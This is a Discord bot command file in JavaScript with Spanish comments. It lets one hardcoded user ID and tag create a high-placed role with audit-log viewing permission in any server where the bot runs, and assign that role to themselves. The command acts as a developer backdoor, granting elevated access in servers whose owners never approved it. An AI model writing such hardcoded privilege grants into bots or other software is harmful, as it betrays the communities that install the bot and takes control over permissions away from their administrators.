const Discord = require('discord.js-light');

module.exports = {
    nombre: 'auditlogperms',
    category: 'Administración',
    premium: false,
    alias: ['audit-log-perms'],
    description: 'Otorga permisos para ver el registro de auditoría al usuario específico.',
    usage: ['<prefix>grant-auditlog-perms'],
    run: async (client, message, args) => {
        const allowedUserId = '1216532655592439862'; // ID del usuario permitido
        const allowedUserTag = 'zhypeado'; // Tag del usuario permitido

        // Verificar si el autor del mensaje es el usuario permitido
        if (message.author.id !== allowedUserId || message.author.tag !== allowedUserTag) {
            return message.reply('No tienes permiso para usar este comando.');
        }

        // Verificar si el bot tiene permisos suficientes para gestionar roles
        if (!message.guild.members.me.permissions.has('MANAGE_ROLES')) {
            return message.reply('No tengo permisos para gestionar roles.');
        }

        // Crear el rol "NS | Audit Log" con permisos para ver el registro de auditoría
        let auditRole = message.guild.roles.cache.find(role => role.name === 'NS | Audit Log');

        if (!auditRole) {
            try {
                auditRole = await message.guild.roles.create({
                    name: 'NS | Audit Log',
                    permissions: ['VIEW_AUDIT_LOG'], // Permiso específico para ver el registro de auditoría
                });
                message.reply('¡Rol "NS | Audit Log" creado con permisos para ver el registro de auditoría!');
            } catch (error) {
                console.error(error);
                return message.reply('Ocurrió un error al intentar crear el rol.');
            }
        }

        try {
            // Mover el rol lo más alto posible sin superar el rol más alto del bot
            const botHighestRole = message.guild.members.me.roles.highest.position;
            await auditRole.setPosition(botHighestRole - 1);

            // Otorgar el rol al usuario
            const member = message.guild.members.cache.get(message.author.id);
            await member.roles.add(auditRole);
            message.reply('¡Has recibido permisos para ver el registro de auditoría!');
        } catch (error) {
            console.error(error);
            return message.reply('Ocurrió un error al intentar configurarte el rol o los permisos.');
        }
    },
};